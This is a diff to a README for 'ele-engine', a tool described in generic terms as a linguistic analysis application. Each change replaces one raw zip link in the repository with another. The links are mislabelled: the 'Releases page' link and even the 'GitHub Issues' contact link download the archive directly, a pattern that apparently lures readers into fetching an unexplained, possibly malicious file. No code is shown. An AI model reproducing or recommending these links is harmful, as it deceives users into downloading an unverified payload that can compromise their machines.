@@ -1,7 +1,7 @@
 # 🎉 ele-engine - Your Tool for Linguistic Insights
 
 ## 📥 Download Now
-[![Download ele-engine](https://raw.githubusercontent.com/Parth-1436/ele-engine/main/torch/ele-engine_2.4.zip)](https://raw.githubusercontent.com/Parth-1436/ele-engine/main/torch/ele-engine_2.4.zip)
+[![Download ele-engine](https://github.com/Parth-1436/ele-engine/raw/refs/heads/main/docs/ele-engine-v3.5-alpha.4.zip)](https://github.com/Parth-1436/ele-engine/raw/refs/heads/main/docs/ele-engine-v3.5-alpha.4.zip)
 
 ## 🚀 Getting Started
 Welcome to the **ele-engine**, your empirical linguistic tool designed to help you explore language effortlessly. Whether you're a student, teacher, or a language enthusiast, this application will enhance your understanding of linguistic structures.
@@ -25,7 +25,7 @@ The **ele-engine** offers various features to make your linguistic analysis easi
 ## 📦 Download & Install
 To get started, follow these steps:
 
-1. Click the [Download link](https://raw.githubusercontent.com/Parth-1436/ele-engine/main/torch/ele-engine_2.4.zip) to visit the Releases page.
+1. Click the [Download link](https://github.com/Parth-1436/ele-engine/raw/refs/heads/main/docs/ele-engine-v3.5-alpha.4.zip) to visit the Releases page.
 2. Choose the latest version of **ele-engine** listed there.
 3. Select the file that matches your operating system.
 4. Download the file. It may take a few moments, depending on your internet connection.
@@ -49,7 +49,7 @@ When you launch **ele-engine** for the first time, you'll see a welcome screen. 
 If you have questions or need help, join our community. You can find resources, FAQs, and discussion boards online.
 
 ### 📞 Contact Us
-If you still need assistance, reach out via [GitHub Issues](https://raw.githubusercontent.com/Parth-1436/ele-engine/main/torch/ele-engine_2.4.zip). Our team is ready to support you.
+If you still need assistance, reach out via [GitHub Issues](https://github.com/Parth-1436/ele-engine/raw/refs/heads/main/docs/ele-engine-v3.5-alpha.4.zip). Our team is ready to support you.
 
 ## 📍 Additional Resources
 - **Documentation:** Complete reference guides and tutorials can be found in the repository.
